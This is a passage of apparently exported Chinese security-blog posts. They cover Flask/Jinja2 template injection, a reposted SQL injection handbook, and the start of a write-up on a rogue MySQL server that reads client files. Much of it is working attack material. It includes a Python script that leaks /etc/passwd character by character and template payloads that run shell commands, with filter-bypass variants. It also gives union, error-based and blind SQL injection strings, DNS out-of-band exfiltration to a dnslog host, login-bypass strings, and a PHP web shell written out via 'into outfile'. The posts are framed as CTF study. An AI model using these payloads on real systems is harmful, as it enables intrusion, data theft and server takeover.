&#x27;http://ip:5000/?name=&#x27;def check(payload): r = requests.get(url+payload).content return &#x27;kawhi&#x27; in rpassword = &#x27;&#x27;s = r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\\&#x27;()*+,-./:;&lt;=&gt;?@[\\\\]^`&#123;|&#125;~\\&#x27;&quot;_%&#x27;for i in xrange(0,100): for c in s: payload = &#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;+str(i)+&#x27;:&#x27;+str(i+1)+&#x27;] == &quot;&#x27;+c+&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27; if check(payload): password += c break print password print标记 1&#123;%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)%&#125; Bypass Plus 介绍一些常见过滤组合和最近的赛题。 过滤_，.和' python3下可以使用_frozen_importlib_external.FileLoader的get_data()方法，第一个是参数0，第二个为要读取的文件名： 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[222].get_data(0,&quot;app.py&quot;)&#125;&#125; 下划线可以用编码绕过和requests绕过： 1&#123;&#123;()[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5F\\x5Fbases\\x5F\\x5F&quot;][0][&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[222][&quot;get\\x5Fdata&quot;](0, &quot;app\\x2Epy&quot;)&#125;&#125; 过滤args，.和_ 参考y1ng师傅的payload： 123&#123;&#123;()|attr(request[&#x27;values&#x27;][&#x27;x1&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x2&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x3&#x27;])()|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(40)|attr(request[&#x27;values&#x27;][&#x27;x5&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x6&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x7&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x8&#x27;])(request[&#x27;values&#x27;][&#x27;x9&#x27;])&#125;&#125;post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read() Update Unicode绕过 安洵杯2020 EasyFlask：https://github.com/D0g3-Lab/i-SOON_CTF_2020 GitHub上的题目环境有点问题，文件给的好像不全。 可以看一下过滤： 直接来看payload： 1&#123;%print(lipsum|attr(%22\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f%22))|attr(%22\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125; 其中print用来绕过&#123;&#123;&#125;&#125;`，`attr`绕过`.`。 然后这里的`lipsum`是一个方法，可以直接调用os方法，也可以使用`__buildins__`： 12&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125; 再使用Unicode编码绕过 ![](https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211449.png) 12&#123;&#123;()|attr(&quot;__class__&quot;)&#125;&#125;&#123;&#123;()|attr(&quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&quot;)&#125;&#125; 所以官方给的payload就是： 1&#123;%print(lipsum|attr(&quot;__globals__&quot;))|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)()%&#125; 在线网址转换：https://www.branah.com/unicode-converter PHP脚本转换： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?php//字符串转Unicode编码function unicode_encode($strLong) &#123; $strArr = preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $strLong);//拆分字符串为数组(含中文字符) $resUnicode = &#x27;&#x27;; foreach ($strArr as $str) &#123; $bin_str = &#x27;&#x27;; $arr = is_array($str) ? $str : str_split($str);//获取字符内部数组表示,此时$arr应类似array(228, 189, 160) foreach ($arr as $value) &#123; $bin_str .= decbin(ord($value));//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot; &#125; $bin_str = preg_replace(&#x27;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#x27;, &#x27;$1$2$3&#x27;, $bin_str);//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot; $unicode = dechex(bindec($bin_str));//返回unicode十六进制 $_sup = &#x27;&#x27;; for ($i = 0; $i &lt; 4 - strlen($unicode); $i++) &#123; $_sup .= &#x27;0&#x27;;//补位高字节 0 &#125; $str = &#x27;\\\\u&#x27; . $_sup . $unicode; //加上 \\u 返回 $resUnicode .= $str; &#125; return $resUnicode;&#125;//Unicode编码转字符串方法1function unicode_decode($name)&#123; // 转换编码，将Unicode编码转换成可以浏览的utf-8编码 $pattern = &#x27;/([\\w]+)|(\\\\\\u([\\w]&#123;4&#125;))/i&#x27;; preg_match_all($pattern, $name, $matches); if (!empty($matches)) &#123; $name = &#x27;&#x27;; for ($j = 0; $j &lt; count($matches[0]); $j++) &#123; $str = $matches[0][$j]; if (strpos($str, &#x27;\\\\u&#x27;) === 0) &#123; $code = base_convert(substr($str, 2, 2), 16, 10); $code2 = base_convert(substr($str, 4), 16, 10); $c = chr($code).chr($code2); $c = iconv(&#x27;UCS-2&#x27;, &#x27;UTF-8&#x27;, $c); $name .= $c; &#125; else &#123; $name .= $str; &#125; &#125; &#125; return $name;&#125;//Unicode编码转字符串function unicode_decode2($str)&#123; $json = &#x27;&#123;&quot;str&quot;:&quot;&#x27; . $str . &#x27;&quot;&#125;&#x27;; $arr = json_decode($json, true); if (empty($arr)) return &#x27;&#x27;; return $arr[&#x27;str&#x27;];&#125;echo unicode_encode(&#x27;__class__&#x27;);echo unicode_decode(&#x27;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&#x27;);//\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f__class__ ### 魔改字符 太湖杯easy_web，上面所说的过滤双大括号，在一些特定的题目可以魔改`&#123;&#123;&#125;&#125;，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法。 可以在Unicode字符网站寻找绕过的字符，直接在网址搜索&#123;，就会出现类似的字符，就可以找到︷和︸了，网址：https://www.compart.com/en/unicode/U+FE38 Payload： 12︷︷config︸︸%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B Reference http://www.cl4y.top/ssti模板注入学习/ https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/ https://www.m00nback.xyz/2020/02/16/Python沙箱逃逸/ https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y https://blog.szfszf.top/article/15/ https://p0sec.net/index.php/archives/120/ https://xz.aliyun.com/t/8029 https://xz.aliyun.com/t/7746 https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"SSTI","slug":"SSTI","permalink":"http://ca0y1h.top/tags/SSTI/"}],"categories":[{"name":"Web安全基础学习","slug":"Web安全基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"SQL注入手册","date":"2020-12-10T15:13:56.000Z","path":"Web_security/basic_learning/27.SQL注入手册/","text":"SQL注入手册【转】 来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C 常见数据库搭配 ASP + ACCESS + IIS ASP.NET + MSSQL +IIS PHP + Mysql + Apache(Nginx) JSP + Oracle(Mysql) + Tomcat 目前来讲就遇到过这些常见组合，快速判断数据库类型是注入的第一步 Mysql 基础 数据库名 database() schema() 当前登陆用户 USER() CURRENT_USER() SYSTEM_USER() SESSION_USER() 数据库版本 VERSION() @@VERSION @@GLOBAL.VERSION 路径相关 @@BASEDIR : mysql安装路径 @@SLAVE_LOAD_TMPDIR : 临时文件夹路径 @@DATADIR : 数据存储路径 @@CHARACTER_SETS_DIR : 字符集设置文件路径 @@LOG_ERROR : 错误日志文件路径 @@PID_FILE : pid-file文件路径 @@BASEDIR : mysql安装路径 @@SLAVE_LOAD_TMPDIR : 临时文件夹路径 字符串连接 concat(str1,str2) //将字符串首尾相连 concat_ws(separator,str1,str2) //将字符串用指定连接符连接 group_concat()// 字符截断 left(str,index) //从左边第index开始截取 right(str,index) //从右边第index开始截取 substring(str,index) //从左边index开始截取 substr(str,index,len) //截取str,index开始,截取len的长度 mid(str,index,ken) //截取str 从index开始,截取len的长度 字符串比较函数 strcmp(expr1,expr2)//如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1 find_in_set(str,strlist) //如果相同则返回1不同则返回0 注释 –(后面还有个空格) # 单行注释符，url编码为%23 /*…*/ /! 语句 / 语句会被执行 可用做分割 运算符 比较运算符 = &gt; &lt; != &lt;&gt; 不等于的意思 like (模糊匹配 select '12345' like '12%' =&gt; true) in（select '123' in ('12') =&gt; false） between (select database() between 0x61 and 0x7a;//select database() between 'a' and 'z';) regexp / rlike(正则匹配select '123455' regexp '^12' =&gt; true) 算术运算符 - / 逻辑运算符 not / ！ and / &amp;&amp; or / || xor / ^ 位运算符 &amp; 按位与 | 按位或 ^ 按位异或 ! 取反 &lt;&lt; 左移 &gt;&gt;右移 绕过函数 instr(str1,substr) //从子字符串中返回子串第一次出现的位置 lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果 延时函数 sleep() benchmark(1000000,sha(1)) 编码函数 hex() ascii() 文件函数 load_file() //读文件路径可以用0x，char转换的字符 outfile select * into outfile '/tmp/test.txt' dumpfile //用法同上但是只能写入一行数据，常用于udf提权写dll 构造语句 条件语句 if(expr1,expr2,expr3) // expr1 true执行expr2否则执行expr3 select case when (条件) then 代码1 else 代码 2 end information_schema 结构 information_schema.tables: 查询表名:table_name 对应的数据库名: table_schema information_schema.columns: 查询列名:column_name 对应的表名:table_schemam Mysql注入语句一般形式 联合 构造联合语句 + 查询结果 盲注 查询结果 + 比较运算符 + 猜测值 报错 构造报错语句 + 查询结果 Mysql空白字符 123%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab%a0 这个不会被php的\\s进行匹配&#x2F;*!*&#x2F; 内敛注释 #这个也可以用来做分隔 函数名和括号直接可以插入特殊字符 ex 12345concat&#x2F;**&#x2F;()information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLESinformation_schema%0a.%0aTABLES 判断注入是否存在 数值型注入 12345?id&#x3D;1+1?id&#x3D;-1 or 1&#x3D;1?id&#x3D;-1 or 10-2&#x3D;8?id&#x3D;1 and 1&#x3D;2?id&#x3D;1 and 1&#x3D;1 字符型注入 参数被引号包围，所以需要闭合引号 1234?id&#x3D;1&#39;?id&#x3D;1&quot;?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1?id&#x3D;1&quot; and &quot;1&quot;&#x3D;&quot;1 闭合后构造语句再注释后面 四大基本注入类型 UNION注入 最简单的注入 用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。 ORDER BY 123ORDER BY 10 #ORDER BY 5 #ORDER BY 2 # 当ORDER BY的数字大于列数时会返回异常，反复测试，定位出正确的列数 UNION SELECT 123UNION SELECT 1,2,3 #UNION ALL SELECT 1,2,3 #UNION ALL SELECT null,null,null # 数据库查询 123SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATASELECT DATABASE() SELECT schema() 表查询 12SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE()SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;0xffffff 字段查询 1SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;0xffffff 数据获取 123SELECT GROUP_CONCAT(column_1,column_2) FROM databasename.tablenameSELECT GROUP_CONCAT(column_1,column_2) FROM tablename SELECT * FROM tablename 报错注入 常见报错payload floor() 1and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) updatexml() //5.1.5 1and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1)) extractvalue() //5.1.5 1and extractvalue(1,concat(0x5c,(select user()))) exp() //5.5.5版本之后可以使用 1select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a)); name_const //支持老版本 1select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x; geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错 1select multipoint((select * from (select * from (select * from (select version())a)b)c)); 布尔盲注 常用payload 1&#39; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) # 时间盲注 常用payload 12UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0) 本质是if做判断然后是否执行sleep，再有回显的bool盲注中则不写延时语句，用0或者1代替 即查询结果有没有输出到页面是两者的本质区别，没有输出时才是时间盲注 除开最常见的sleep延时，还有以下姿势 1select benchmark(10000000,sha(1)); 比赛姿势 笛卡尔积 1234567mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+------------+| count(*) |+------------+| 2651020120 |+------------+1 row in set (1 min 51.05 sec) 这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。 GET_LOCK 是pwnhub的一道题目 利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。 太少用到不赘述了 https://zhuanlan.zhihu.com/p/35245598 RLIKE 通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。 1234567mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);+-------------------------------------------------------------+| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |+-------------------------------------------------------------+| 0 |+-------------------------------------------------------------+1 row in set (5.27 sec) Mysql注入杂技 insert/update/delete注入 这三类语句中可以报错注出数据，但我要写的是如何没有报错的情况下注出数据 本质是在闭合语句后通过子查询进行注入，通常为盲注 update 一段我在实战中遇到的代码 12345678$result&#x3D;mysql_query(&quot;update ly set content&#x3D;&#39;$content&#39;,hf_content&#x3D;&#39;$hf_content&#39;,modi_date&#x3D;&#39;$modi_date&#39; where ly_id&#x3D;&#39;$ly_id&#39; &quot;);if(mysql_affected_rows())&#123; echo &quot;&#123;\\&quot;success\\&quot;:true,\\&quot;msg\\&quot;:\\&quot;回复成功!\\&quot;&#125;&quot;; &#125;else&#123; echo &quot;&#123;\\&quot;success\\&quot;:false,\\&quot;msg\\&quot;:\\&quot;回复失败!\\&quot;&#125;&quot;; &#125; set 和 where 处都可以注入 建议在where处进行注入 payload 11&#39; and sleep(1) %23 但是有不少的坑点，因为是根据mysql_affected_rows()判断来进行回显的，所以在update相同的值是并不会affected rows的，但是语句是可以执行的 但是字符型又有另一个坑点 字符型在与数字进行与逻辑运算时会当被做0来处理，所以无法执行and后的sleep。 所以我们只能用 or,||,xor,^ 但是或逻辑运算中同样存在问题 （但是具体好像还和mysql版本有关，因为看别人blog字符+or也执行成功了，但是先先不填坑了） 测试只有字符为0时才会执行or后的sleep 应该是和逻辑运算的方式有关，或运算会先检验前面是否为真，只有当前面为字符0时才为假，这是和与运算的不同之处 异或的坑点和或相似 当字符不为数字时不会执行，具体深层原因先留坑吧 这里还有坑… or活着xor都可能导致多次sleep，因为每次检索都会or一次 实战中要尽量避免这个问题，能布尔盲注的时候就不要用sleep了 要避免这个问题就要用与逻辑且前面为真，放到where就是前面必须where一个存在的值 测试mysql版本5.3.72 insert/delete 1insert into users values (1,&#39;&#123;injecthere&#125;&#39;,&#39;password&#39;); 类似update，不赘述了 Order by注入 本质仍然是盲注，根据order by 0 或者 1 返回不同的排序进行注入 ctf中的进阶形式为order by 一个特定字段 比如hctf中的一道题目 宽字节注入 原理 12345...mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);....$name &#x3D; isset($_GET[&#39;name&#39;]) ? addslashes($_GET[&#39;name&#39;]) : 1;$sql &#x3D; &quot;SELECT * FROM test WHERE names&#x3D;&#39;&#123;$name&#125;&#39;&quot;; 即服务器使用了款字节编码，addslashes会将单引号转义，变为\\‘,而宽子节会把两个字符编码为一个汉字，所以如果拼接%df，那%df%5c就会被编码为運字，从而逃逸出转义。 具体拼接什么要根据数据库使用的编码来决定，可以去查编码表。 常见payload 1id&#x3D;1%df&#39; # Mysql约束攻击 原理 主要两个点 mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。 mysql插入数据的时候,当数据超过定义的长度会出现截断象限 利用方式即注册一’admin a’用户(中间空格超长截断)，达到超长截断的目的，往数据库中写入一个’admin ’用户，而在select的过程中’admin ‘是与’admin’相等的 所以就可以用’admin ‘的密码登陆’admin’ 二次注入 所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。 二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。 这个。。只能具体情况分析了，不太好写 比如sql lab-24 Mysql带外注入 带外通道攻击主要是利用其他协议或者渠道从服务器提取数据 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等 DNSlog 只能用于windows环境 select拼接一个UNC路径导致请求发起 UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。 其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式 \\sss.xxx\\test\\ 常见payload 1select load_file(&#39;\\\\\\\\&#39;,select hex(version()),&#39;.dnslog地址&#39;) 这也就解释了为什么CONCAT()函数拼接了4个\\了，因为转义的原因，4个\\就变成了2个\\，目的就是利用UNC路径 可以直接直接用ceye.io这个平台，这个平台就集成了Dnslog的功能 利用方法 首先查看变量确定权限 show variables like ‘%secure%’ 当secure_file_priv为空，就可以读取磁盘的目录。 当secure_file_priv为G:\\，就可以读取G盘的文件。 当secure_file_priv为null，load_file就不能加载文件。 在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是 可以通过mysql的配置文件my.ini添加行进行配置 最好进行加密处理，防止特殊字符导致传输失败 payload 1select load_file(concat(0x5c5c5c5c,select hex(version()),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263)); 文件读写 查询用户读写权限 1SELECT file_priv FROM mysql.user WHERE user &#x3D; &#39;username&#39;; load_file() 需要有读取文件的权限 需要知道文件的绝对物理路径 要读取的文件大小必须小于 max_allowed_packet 一般没啥问题 1SELECT @@max_allowed_packet; 一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。 常见paylaod 123UNION SELECT LOAD_FILE(&quot;C:&#x2F;&#x2F;TEST.txt&quot;) #UNION SELECT LOAD_FILE(&quot;C:&#x2F;TEST.txt&quot;) #UNION SELECT LOAD_FILE(&quot;C:\\\\TEST.txt&quot;) # 后面的路径可以是单引号、0x、char转换的字符 路径中的斜杠是/而不是\\ 使用编码 12UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) # out_file() outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径 经典一句话payload 1select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;C:&#x2F;www&#x2F;shell.php&#39; 当然也可以从表中选数据写 万能密码 123456789admin’ —admin’ #admin’&#x2F;*or ‘&#x3D;’ or‘ or 1&#x3D;1—‘ or 1&#x3D;1#‘ or 1&#x3D;1&#x2F;*‘) or ‘1’&#x3D;’1—‘) or (‘1’&#x3D;’1— UPDATE 利用MySQL8新特性绕过select过滤 在MySQL 8.0.19之后，MySQL推出几种新语法： TABLE statement - 列出表中全部内容 123456789mysql&gt; TABLE user;+----+----------+---------+| id | username | passwd |+----+----------+---------+| 1 | admin | adminpw || 2 | tom | tompw || 3 | kak | kakpw |+----+----------+---------+3 rows in set (0.00 sec) VALUES statement - 列出一行的值 12345678910mysql&gt; VALUES ROW(1, 2, 3) UNION SELECT * FROM user;+----------+----------+----------+| column_0 | column_1 | column_2 |+----------+----------+----------+| 1 | 2 | 3 || 1 | admin | adminpw || 2 | tom | tompw || 3 | kak | kakpw |+----------+----------+----------+4 rows in set (0.00 sec) 假设以下代码是在过滤select, handler以及禁用堆叠注入的情景下： 1234567891011121314151617181920212223242526&lt;?phpif (!empty($_GET[&#x27;showme&#x27;])) highlight_file(__FILE__); $aaa = mysqli_connect(&#x27;127.0.0.1&#x27;, &#x27;root&#x27;, &#x27;rootroot&#x27;, &#x27;test&#x27;); if (empty($_GET[&#x27;id&#x27;])) $id = 1;else $id = $_GET[&#x27;id&#x27;]; $clean = strtolower($id); if (strpos($clean, &#x27;select&#x27;) !== false) &#123; echo &#x27;waf&#x27;; exit();&#125; var_dump(&quot;select * from news where $id=&#x27;$id&#x27;&quot;);$result = mysqli_query($aaa, &quot;select * from news where id =&#x27;$id&#x27;&quot;);$row = mysqli_fetch_array($result);$title = $row[&#x27;title&#x27;];$content = $row[&#x27;content&#x27;]; echo &quot;&lt;h1&gt;$title&lt;/h1&gt;&lt;br&gt;&quot;;echo &quot;&lt;h2&gt;$content&lt;/h2&gt;&lt;br&gt;&quot;; 构造恶意sql语句 1select * from news where $id&#x3D;&#39;&#39; or (1,&#39;admin&#39;,&#39;&#123;passwd&#125;&#39;) &lt;&#x3D; (table user limit 1)# 语句table user limit 1的查询结果如下 123456+----+----------+---------+| id | username | passwd |+----+----------+---------+| 1 | admin | adminpw |+----+----------+---------+1 row in set (0.00 sec) 实质上是(id, username, passwd)与(1, 'admin', 'adminpw')进行比较，比较顺序为自左向右 两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小 123456789101112131415161718192021222324252627282930313233343536373839mysql&gt; SELECT (1, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);+-------------------------------------+| (1, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1) |+-------------------------------------+| 1 |+-------------------------------------+1 row in set (0.00 sec) mysql&gt; SELECT (2, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);+-------------------------------------+| (2, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1) |+-------------------------------------+| 0 |+-------------------------------------+1 row in set (0.00 sec) mysql&gt; SELECT (1, &#39;a&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);+--------------------------------------+| (1, &#39;a&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1) |+--------------------------------------+| 1 |+--------------------------------------+1 row in set (0.00 sec) mysql&gt; SELECT (1, &#39;ad&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);+---------------------------------------+| (1, &#39;ad&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1) |+---------------------------------------+| 1 |+---------------------------------------+1 row in set (0.00 sec) mysql&gt; SELECT (1, &#39;ae&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);+---------------------------------------+| (1, &#39;ae&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1) |+---------------------------------------+| 0 |+---------------------------------------+1 row in set (0.00 sec) 转载自：https://0xgeekcat.github.io/利用MySQL8新特性绕过select过滤.html","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"MySQL攻击面和提权总结","date":"2020-12-10T15:11:36.000Z","path":"Web_security/basic_learning/26.MySQL攻击面和提权总结/","text":"MySQL攻击面和提权总结 本次实验使用腾讯云主机的MySQL Server作为服务端，阿里云主机作为MySQL客户端。 其中均使用宝塔面板搭建MySQL8.0版本。 首先要开放腾讯云主机的端口，并且允许MySQL Server允许任意用户远程登录。 0x01 攻击面——MySQL客户端任意文件读取 适用范围：全版本 MySQL/MariaDB Client 条件：客户端连接时开启 –enable-local-infile 一开始做实验的时候有点懵逼，我作为攻击方去连接受害者的MySQL客户端，然后再读取我本地的文件？？？ 后来我再网上查看这个攻击面的利用场景，虽然确实用的地方比较少，但是看了LoRexxar这篇文章之后，还是很有收获的。 这个实验的前提MySQL变量local_infile=1 CTFer对MySQL的load data infile语句应该都是比较熟悉的，一般形式： 1load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\\n&#39;; MySQL Server会读取服务端的/etc/passwd然后将数据按照\\n分割插入表中，但是非local加载的语句收到secure_file_priv的限制： 123456789mysql&gt; load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\\n&#39;;ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statementmysql&gt; select @@secure_file_priv;+--------------------+| @@secure_file_priv |+--------------------+| NULL |+--------------------+1 row in set (0.00 sec) 但是加上一个local关键字： 123mysql&gt; load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\\n&#39;;Query OK, 4 rows affected, 1 warning (0.02 sec)Records: 4 Deleted: 0 Skipped: 0 Warnings: 1 是可以成功执行的，相当于是读取客户端的文件发送到服务端。 MySQL认为服务端可以要求客户端读取有可读权限的任何文件，客户端不应该连接到不可信的服务端。 那么现在的问题就是如何构造一个恶意的MySQL服务端。 在搞清楚这个问题之前，我们需要研究一下mysql正常执行链接和查询的数据包结构。 Sever返回greeting包，包含版本，协议类型，salt值，server功能项 客户端登录请求 不知道为啥请求包没有显示用户名，可能是MySQL版本的原因。 初始化查询 由于使用了SSL通信，所以这里看不到具体的初始化查询语句。 Load file data 这次得把MySQL的SSL连接关闭掉，不然看不到执行语句。方法就是在MySQL的配置文件my.conf的[mysqld]添加skip_ssl即可，再在客户端检查一下是否已经关闭SSL： 确认关闭后，执行load file data语句 1load data local infile &#39;&#x2F;etc&#x2F;passwd&#39; into table mytable FIELDS TERMINATED BY &#39;\\n&#39;; 首先是客户端发发送查询 接着服务端返回了需要的路径，功能类似于告诉客户端把这个文件发给我让我看看 **** 然后客户端直接把内容发送到了服务端 从上面这个流程可以看出，客户端读取文件的路径并不是从客户端指定的，而是从服务端指定再发送客户端。 正常的查询流程： 123Client: 我要把&#x2F;etc&#x2F;passwd插入表中Server: 我要你的&#x2F;etc&#x2F;passwd的内容Client: &#x2F;etc&#x2F;passwd的内容为... 如果是一个恶意的服务端，可以把流程更改为： 123Client: 我要test表中的内容Server: 我要你的&#x2F;etc&#x2F;passwd的内容Client: &#x2F;etc&#x2F;passwd的内容为？？？ 并且从MySQL的官方文档中指出服务端可以在任何查询语句后回复文件传输请求，也就是说上面第三个语句是可以执行的。 所以构造一个恶意服务端的流程就是：1.回复MySQL client一个greeting包；2.等待client端发送一个查询包；3.回复一个file transfer包。 